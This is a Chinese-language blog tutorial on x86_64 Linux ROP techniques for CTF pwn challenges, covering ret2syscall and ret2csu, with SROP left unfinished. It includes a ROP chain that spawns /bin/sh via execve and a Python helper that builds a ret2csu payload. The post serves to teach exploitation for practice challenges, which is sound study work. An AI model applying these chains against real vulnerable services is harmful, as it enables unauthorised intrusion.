# ROP 技巧补坑

## 前言

前面我们讲了不少 `ret2xxx` 系列，但是把 `ret2syscall` 漏掉了。  
这篇就先把这个坑补上，顺手把 `ret2csu` 和 `SROP` 也带一下。

可以配套视频，但是别找了，这期视频我没录。  
另外这次的 blog 是我用手机写的，所以图会比较少，基本可以当成纯文字笔记看。

> 说明：本文默认讨论 **x86_64 Linux** 场景。  
> 如果是 32 位程序、其他架构，或者题目开了额外限制，那么系统调用号、寄存器约定和 gadget 写法都要重新确认。

## ret2syscall

### 基本原理

程序和内核交互要靠系统调用，可以粗略理解成：

```c
SYSCALL(syscall_id, arg1, arg2, ...);
```

系统调用本质上是内核暴露给用户态程序的接口。像文件读写、网络通信、进程控制这类操作，最后都要落到系统调用上。

不同架构发起系统调用的方式不同：

- 32 位 Linux 常见是 `int 0x80`
- 64 位 Linux 常见是 `syscall`

在 **x86_64 Linux** 下，常见的系统调用约定是：

- `rax`：系统调用号
- `rdi`、`rsi`、`rdx`、`r10`、`r8`、`r9`：前 6 个参数
- 返回值放回 `rax`

> 这里要区分清楚“函数调用约定”和“系统调用约定”。  
> 例如普通的 System V AMD64 调用约定里第 4 个参数常走 `rcx`，但 `syscall` 这里通常要放到 `r10`。

系统调用进入内核态后，可能很快返回，也可能发生阻塞。  
它的额外开销主要来自用户态和内核态之间的切换，而不是“所有系统调用都一定特别慢”。

### 一个简单的 `read` 例子

`read` 本身就是系统调用，`libc` 里的 `read` 只是对它的一层封装。  
为了方便说明，这里直接假设缓冲区地址已经准备好了：

```asm
mov rdi, 0      ; fd = 0, stdin
mov rsi, buf    ; buf
mov rdx, 64     ; count
mov rax, 0      ; __NR_read
syscall
```

这段代码等价于：

```c
read(0, buf, 64);
```

如果系统调用失败，错误通常会体现在 `rax` 返回负值，而不是“程序自动停住”。

### 在 ROP 里怎么用

`ret2syscall` 的核心思路是：当我们拿不到 `libc` 地址，或者题目本来就是想考系统调用时，直接布置好寄存器，然后执行 `syscall` gadget。

在 x86_64 Linux 下，如果我们想执行：

```c
execve("/bin/sh", NULL, NULL);
```

那么需要满足：

- `rax = 59`
- `rdi = "/bin/sh"` 的地址
- `rsi = 0`
- `rdx = 0`

对应的 ROP 链可以写成：

```plain
pop rdi ; ret
bin_sh_addr
xor rsi, rsi ; ret
xor rdx, rdx ; ret
pop rax ; ret
59
syscall ; ret
```

如果没有 `xor rsi, rsi ; ret` 或 `xor rdx, rdx ; ret` 这类 gadget，也可以改成 `pop rsi ; ret`、`pop rdx ; ret` 再传 `0`。

这样做的好处是：

- 不依赖 `system` 或 `execve` 的 `libc` 地址
- 很适合没有 libc 泄露、但有足够 syscall/gadget 的题
- 常见用途包括拿 shell、做 ORW（`open` / `read` / `write`）等

> `ret2syscall` 并不等于“一定不会出错”。  
> 你仍然要确认：
>
> - 架构和系统调用号是否匹配
> - gadget 是否真的以 `ret` 结束
> - 指针是否可访问
> - 当前链条是否满足栈和寄存器约束

### 调试时要注意什么

最容易混淆的点，不是“内核版本差一点就完全不能用”，而是下面这些：

- **架构不同**：32 位和 64 位的系统调用号、寄存器约定都不同
- **ABI 不同**：别把普通函数调用约定和 `syscall` 约定混在一起
- **返回值判错**：系统调用失败时，通常是 `rax` 返回错误码，而不是直接崩溃
- **安全机制限制**：有些题会开 `seccomp`，这时不是链子写错，而是系统调用本身被过滤了

### 具体题目

咕咕咕。  
没环境做不了，请读者自己找题练一下喵。

## ret2csu

`ret2csu` 一般是利用 `__libc_csu_init` 里的 gadget，来完成参数控制和一次间接调用。  
它常见于没有现成 `pop rdx ; ret`、`pop rsi ; ret` 等 gadget 的场景。

> 先提醒一句：`ret2csu` 的可用性和具体形态取决于实际二进制。  
> 新工具链下，经典 gadget 可能变少，甚至根本没有，所以一定要以**你手上的反汇编结果**为准。

下面这个例子里，我们主要关注两段：

```asm
0000000000401240 <__libc_csu_init>:
  ...
  401280:       mov    rdx, r15    // 标号1
  401283:       mov    rsi, r14
  401286:       mov    edi, r13d
  401289:       call   qword ptr [rbx+r12*8]
  40128d:       add    r12, 0x1
  401291:       cmp    rbp, r12
  401294:       jne    401280 <__libc_csu_init+0x40>
  401296:       add    rsp, 0x8
  40129a:       pop    rbx         // 标号2
  40129b:       pop    rbp
  40129c:       pop    r12
  40129e:       pop    r13
  4012a0:       pop    r14
  4012a2:       pop    r15
  4012a4:       ret
```

### 这一版 gadget 的寄存器关系

如果先执行“标号 2”，再跳到“标号 1”，那么这份反汇编里常见的控制关系是：

- `rbx = 函数指针所在的内存地址`
- `rbp = 1`
- `r12 = 0`
- `r13 = edi`
- `r14 = rsi`
- `r15 = rdx`

原因是这里真正执行的是：

```asm
call qword ptr [rbx + r12*8]
```

所以如果想只调用一次，通常让：

- `r12 = 0`
- `rbp = 1`

这样 `add r12, 1` 之后就能满足退出条件，不会继续循环。

> 注意：
>
> - 这里调用的是“内存里的函数指针”，不是把函数地址直接塞给 `rbx`
> - `mov edi, r13d` 只会保留低 32 位，所以第一个参数如果是 64 位指针，往往还得额外找 `pop rdi ; ret`
> - 不同二进制里也常见 `call [r12 + rbx*8]` 这种变体，寄存器含义会跟着交换，别照抄模板

### 一个更稳妥的 payload 例子

原文里那个 `payload = flat(...)` 会把前面已经拼进去的内容覆盖掉，而且少了循环退出后要吃掉的栈槽。  
更稳妥的写法可以像这样：

```python
def build_ret2csu(func_ptr_addr, edi, rsi, rdx, next_rip):
    payload  = p64(CSU_POP_GADGET)   # 标号2
    payload += flat(
        func_ptr_addr,  # rbx
        1,              # rbp
        0,              # r12
        edi,            # r13 -> edi
        rsi,            # r14 -> rsi
        rdx,            # r15 -> rdx
    )
    payload += p64(CSU_CALL_GADGET)  # 标号1

    # 经过 call / add / cmp 之后，函数还会继续执行：
    # add rsp, 0x8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    payload += flat(
        0,  # add rsp, 0x8 吃掉的占位
        0, 0, 0, 0, 0, 0,
        next_rip,
    )
    return payload
```

这个版本的重点不是“万能模板”，而是提醒你两件事：

- 要按**实际 pop 顺序**摆参数
- 要把 gadget 后续会额外消耗的栈空间一起算进去

### 题目

这里可以看一下第 18 届极客大挑战的 `oldrop`，考的是 `csu` 的变种，挺适合练手。

## SROP

这一节先留个坑，后面有空再补。

可以先参考这个视频：  
[CTF 基础教程 ---- Pwn 第四课 SROP - 哔哩哔哩](https://b23.tv/xqhC94u)

咕咕咕。
